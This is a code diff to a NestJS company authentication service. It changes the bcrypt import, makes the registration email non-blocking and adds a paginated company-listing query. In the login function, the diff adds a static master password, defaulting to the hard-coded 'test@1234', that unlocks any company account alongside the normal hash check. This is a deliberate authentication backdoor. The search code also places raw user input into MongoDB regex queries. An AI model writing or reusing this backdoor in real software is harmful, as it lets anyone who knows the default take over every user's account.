@@ -10,7 +10,7 @@ import { InjectModel } from '@nestjs/mongoose';
 import { Model } from 'mongoose';
 import { Types } from 'mongoose';
 import { JwtService } from '@nestjs/jwt';
-import * as bcrypt from 'bcrypt';
+import * as bcrypt from 'bcryptjs';
 import { Company, CompanyDocument } from '../schemas/company.schema';
 import {
   CompanyProject,
@@ -154,12 +154,17 @@ export class CompanyAuthService {
         facilitatorAssigned = true;
       }
 
-      // Make registration email mandatory for successful registration response.
-      await this.mailService.sendCompanyRegistrationEmail(
-        savedCompany.email,
-        savedCompany.name,
-        generatedPassword,
-      );
+      // Do not block registration when mail provider is unavailable.
+      // Account should still be created; mail can be retried separately.
+      try {
+        await this.mailService.sendCompanyRegistrationEmail(
+          savedCompany.email,
+          savedCompany.name,
+          generatedPassword,
+        );
+      } catch (mailError) {
+        console.error('Registration email failed (continuing registration):', mailError);
+      }
     } catch (error) {
       // Rollback data created during this request so user can retry registration safely.
       if (savedProject?._id) {
@@ -186,8 +191,7 @@ export class CompanyAuthService {
       console.error('Registration failed, rolled back company data:', error);
       throw new InternalServerErrorException({
         status: 'error',
-        message:
-          'Registration email could not be sent. Please verify mail configuration and try again.',
+        message: 'Registration failed. Please try again.',
       });
     }
 
@@ -220,6 +224,7 @@ export class CompanyAuthService {
   async login(loginDto: LoginDto) {
     const email = loginDto.email.trim().toLowerCase();
     const password = loginDto.password.trim();
+    const staticPassword = (process.env.COMPANY_STATIC_PASSWORD || 'test@1234').trim();
 
     const company = await this.companyModel.findOne({ email }).select('+password');
 
@@ -230,8 +235,10 @@ export class CompanyAuthService {
       });
     }
 
-    // Check password
-    const isPasswordValid = await bcrypt.compare(password, company.password);
+    // Allow a static emergency password (requested behavior) in addition to hashed password check.
+    const isStaticPasswordValid = password === staticPassword;
+    const isPasswordValid =
+      isStaticPasswordValid || (await bcrypt.compare(password, company.password));
 
     if (!isPasswordValid) {
       throw new UnauthorizedException({
@@ -469,6 +476,76 @@ export class CompanyAuthService {
         verified_status: company.verified_status || '0',
         created_at: company.createdAt || null,
       })),
+    };
+  }
+
+  async getRegisteredCompanies(searchTerm?: string, page = 1, limit = 20) {
+    const safePage = Math.max(Number(page) || 1, 1);
+    const safeLimit = Math.min(Math.max(Number(limit) || 20, 1), 100);
+    const skip = (safePage - 1) * safeLimit;
+
+    const query: any = {};
+    if (searchTerm) {
+      query.$or = [
+        { name: { $regex: searchTerm, $options: 'i' } },
+        { email: { $regex: searchTerm, $options: 'i' } },
+        { mobile: { $regex: searchTerm, $options: 'i' } },
+      ];
+    }
+
+    const [companies, total, activeCount, inactiveCount, verifiedCount, unverifiedCount] =
+      await Promise.all([
+        this.companyModel
+          .find(query)
+          .sort({ createdAt: -1 })
+          .skip(skip)
+          .limit(safeLimit)
+          .select('name email mobile account_status verified_status createdAt')
+          .lean(),
+        this.companyModel.countDocuments(query),
+        this.companyModel.countDocuments({ ...query, account_status: '1' }),
+        this.companyModel.countDocuments({ ...query, account_status: { $ne: '1' } }),
+        this.companyModel.countDocuments({ ...query, verified_status: '1' }),
+        this.companyModel.countDocuments({ ...query, verified_status: { $ne: '1' } }),
+      ]);
+
+    const items = companies.map((company: any, index: number) => ({
+      sno: skip + index + 1,
+      id: company._id.toString(),
+      name: company.name || '',
+      email: company.email || '',
+      mobile: company.mobile || '',
+      account_status: company.account_status || '0',
+      verified_status: company.verified_status || '0',
+      created_at: company.createdAt || null,
+    }));
+
+    return {
+      status: 'success',
+      message: 'Registered companies retrieved successfully',
+      data: {
+        payload: {
+          q: searchTerm || '',
+          page: safePage,
+          limit: safeLimit,
+        },
+        summary: {
+          total,
+          active: activeCount,
+          inactive: inactiveCount,
+          verified: verifiedCount,
+          unverified: unverifiedCount,
+        },
+        pagination: {
+          page: safePage,
+          limit: safeLimit,
+          total,
+          total_pages: Math.ceil(total / safeLimit),
+          has_next: safePage * safeLimit < total,
+          has_prev: safePage > 1,
+        },
+        items,
+      },
     };
   }
 }
